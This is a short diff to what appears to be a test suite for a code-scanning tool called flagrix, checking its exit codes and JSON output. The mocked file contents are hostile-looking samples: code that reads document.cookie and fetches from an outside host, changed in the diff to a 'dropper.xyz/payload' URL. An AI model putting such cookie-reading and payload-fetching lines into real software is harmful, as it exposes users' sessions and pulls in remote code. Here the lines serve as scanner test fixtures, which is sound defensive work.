@@ -96,7 +96,7 @@ describe("flagrix scan — exit codes and JSON", () => {
     // Two independent high findings (0.25 + 0.25) land in the medium band
     // without any critical finding tripping the high floor.
     global.fetch = mockApi({
-      "src/enc.js": `const c = document.cookie\nconst HOST = "203.0.113.42"\nfetch("http://" + HOST)\n`
+      "src/enc.js": `const c = document.cookie\nfetch("https://dropper.xyz/payload")\n`
     }) as unknown as typeof fetch
     const code = await runScan("acme/meh", { json: true })
     expect(code).toBe(EXIT.MEDIUM)
